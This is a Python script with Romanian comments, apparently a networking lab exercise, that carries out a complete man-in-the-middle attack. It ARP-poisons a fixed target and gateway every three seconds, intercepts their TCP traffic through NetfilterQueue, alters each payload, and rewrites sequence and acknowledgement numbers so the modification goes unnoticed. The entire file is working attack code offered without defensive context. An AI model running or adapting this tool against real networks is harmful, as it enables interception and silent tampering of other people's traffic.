import socket
import logging
import time
import struct
from scapy.all import * 
from netfilterqueue import NetfilterQueue
import os
import threading

# toate flag-urile de care avem nevoie
FIN = 0x01
SYN = 0x02
PSH = 0x08
ACK = 0x10

biggest_seq_nr = (1<<32) -1

# dictionare care sa faca legatura intre seq si ack reale si hack-uite
router_dict = {}
r_router_dict = {}

server_dict = {}
r_server_dict = {}

def get_mac(ip):
    '''
    Functie care sa ceara mac-ul pentru un ip.
    '''
    arp_request = ARP(pdst = ip)
    broadcast = Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
    return answered_list[0][1].hwsrc

print(ls(ARP))

def spoof(target_ip, spoof_ip):
    '''
    Functie care sa trimita un mesaj care sa induca in eroae target-ul.
    '''
    packet = ARP(op = 2, pdst = target_ip, 
                     hwdst = get_mac(target_ip), 
                               psrc = spoof_ip)
  
    send(packet, verbose = False)

def restore(destination_ip, source_ip):
    '''
    Functie care sa restaureze mac-urile la valorile normale.
    '''
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op = 2, pdst = destination_ip, 
                             hwdst = destination_mac, 
                psrc = source_ip, hwsrc = source_mac)
  
    send(packet, verbose = False)

def poison():
    '''
    Functie care sa repete atacul de spoof la fiecare 3 secunde.
    '''
    target_ip = "198.10.0.2"
    gateway_ip = "198.10.0.1"
    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count = sent_packets_count + 2
            print("\rPackets Sent "+str(sent_packets_count), end ="")
            time.sleep(3)
    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        print("[+] Arp Spoof Stopped")


def package_manipulator(packet, source, destination):
    '''
    Functie care sa manipuleze un pachet astfel incat sa nu fie vizibil ca e modificat.
    '''
    old_payload = new_payload = b''
    if packet.haslayer(scapy.all.Raw):
        old_payload = packet[scapy.all.Raw].load
        new_payload = old_payload + (" edited").encode("utf-8")

    future_seq = future_ack = None
    if source == "198.10.0.1":
        future_seq = r_router_dict[packet.seq]
        future_ack = server_dict[packet.ack]
    elif source == "198.10.0.2":
        future_seq = r_server_dict[packet.seq]
        future_ack = router_dict[packet.ack]
    else:
        return packet

    new_packet = IP(
            src = packet[IP].src,
            dst = packet[IP].dst
        ) / TCP (
            sport = packet[TCP].sport,
            dport = packet[TCP].dport,
            seq = future_seq,
            ack = future_ack,
            flags = packet[TCP].flags
        ) / new_payload
    original_ack = (new_packet.seq + len(new_payload))%biggest_seq_nr
    actual_ack = (packet.seq + len(old_payload))%biggest_seq_nr

    if source == "198.10.0.1":
        router_dict[original_ack] = actual_ack
        r_router_dict[actual_ack] = original_ack
    elif source=="198.10.0.2":
        server_dict[original_ack] = actual_ack
        r_server_dict[actual_ack] =  original_ack
    
    return new_packet

def update_maps(packet, source, destination):
    '''
    Functie care sa updateze dictionarele.
    '''
    if source=="198.10.0.2":
        if packet[TCP].ack not in router_dict.keys():
            router_dict[packet[TCP].ack] = packet[TCP].ack
            r_router_dict[packet[TCP].ack] = packet[TCP].ack

        if packet[TCP].seq not in r_server_dict.keys():
            r_server_dict[packet[TCP].seq] = packet[TCP].seq
    elif source=="198.10.0.1":
        if packet[TCP].ack not in server_dict.keys():
            server_dict[packet[TCP].ack] = packet[TCP].ack
            r_server_dict[packet[TCP].ack] = packet[TCP].ack

        if packet[TCP].seq not in r_router_dict.keys():
            r_router_dict[packet[TCP].seq] = packet[TCP].seq

def mitm(packet):
    '''
    Functie care sa prelucreze pachetele primite.
    '''
    payload = packet.get_payload()
    pkt = IP(payload)
    new_pkt = IP(bytes(pkt))

    if pkt.haslayer(IP) and pkt.haslayer(TCP):
        flags = pkt[TCP].flags
        if flags & ACK or flags & PSH:
            source = pkt[IP].src
            destination = pkt[IP].dst
            update_maps(pkt, source, destination)
            new_scapy_packet = package_manipulator(pkt, source, destination)
            new_pkt = new_scapy_packet

    send(new_pkt)
    packet.drop()
def main():
    x = threading.Thread(target=poison, args=())
    x.start()
    queue = NetfilterQueue()
    queue.bind(7, mitm)
    while True:
        try:
            queue.run()
        except KeyboardInterrupt:
            print("\nCtrl + C pressed.............Exiting")
            print("Arp Spoof Stopped")
            target_ip = "198.10.0.2"
            gateway_ip = "198.10.0.1"
            restore(gateway_ip, target_ip)
            restore(target_ip, gateway_ip)
            queue.unbind()
            exit()

if __name__ == "__main__":
    main()

